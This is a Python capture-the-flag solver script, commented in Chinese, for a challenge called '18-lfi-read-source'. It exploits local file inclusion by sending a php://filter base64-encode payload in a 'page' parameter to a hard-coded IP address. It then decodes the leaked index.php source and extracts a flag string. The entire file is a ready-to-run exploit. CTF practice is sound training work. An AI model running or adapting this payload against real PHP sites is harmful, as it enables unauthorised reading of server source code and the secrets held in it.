#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
18-lfi-read-source
利用 php://filter 读取 index.php 源码并提取 TOGOGO-flag{...}
"""

import base64
import re
import sys
from html import unescape
from urllib.parse import urlencode
from urllib.request import Request, urlopen

BASE_URL = "http://47.120.76.57:34099/"
PAYLOAD = "php://filter/convert.base64-encode/resource=index"


def fetch(url: str) -> str:
    req = Request(url, headers={"User-Agent": "CTF-solver/1.0"})
    with urlopen(req, timeout=10) as resp:
        return resp.read().decode("utf-8", errors="ignore")


def extract_box(html: str) -> str:
    m = re.search(r'<div class="box">\s*(.*?)\s*</div>', html, re.S | re.I)
    if not m:
        raise RuntimeError("没有在响应中找到 <div class=\"box\"> Base64 内容")
    return unescape(m.group(1)).strip()


def main() -> None:
    target = BASE_URL + "?" + urlencode({"page": PAYLOAD})
    print("[+] Target:", target)

    html = fetch(target)
    b64_data = extract_box(html)
    print("[+] Got base64 length:", len(b64_data))

    source = base64.b64decode(b64_data).decode("utf-8", errors="ignore")
    print("[+] Decoded source preview:")
    print(source[:300])

    flag_match = re.search(r"TOGOGO-flag\{[^}]+\}", source)
    if not flag_match:
        print("[-] 没找到 flag，可以手工检查解码后的源码", file=sys.stderr)
        sys.exit(1)

    print("[+] FLAG:", flag_match.group(0))


if __name__ == "__main__":
    main()
